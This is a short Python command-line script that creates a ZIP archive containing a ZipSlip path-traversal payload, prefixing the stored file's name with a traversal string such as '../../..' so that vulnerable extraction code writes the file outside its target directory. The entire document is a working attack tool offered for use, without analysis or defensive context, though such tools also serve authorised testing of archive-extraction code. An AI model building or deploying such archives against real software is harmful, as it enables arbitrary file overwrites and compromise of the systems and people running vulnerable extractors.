import zipfile
import os
import argparse

def create_zip(zip_name, file_path, zip_slip_path):
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        return

    file_name = os.path.basename(file_path)
    zip_entry_name = os.path.join(zip_slip_path, file_name)

    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(file_path, arcname=zip_entry_name)
        print(f"Created zip file '{zip_name}' with entry '{zip_entry_name}'")

def main():
    parser = argparse.ArgumentParser(description='Create a ZIP file with ZipSlip path traversal payload.')
    parser.add_argument('-n', '--name', required=True, help='Name of the zip file to create')
    parser.add_argument('-p', '--path', required=True, help='Path to the file to include in the zip')
    parser.add_argument('-z', '--zip-slip', required=True, help='ZipSlip path prefix to add before filename (e.g., ../../..)')

    args = parser.parse_args()

    create_zip(args.name, args.path, args.zip_slip)

if __name__ == '__main__':
    main()
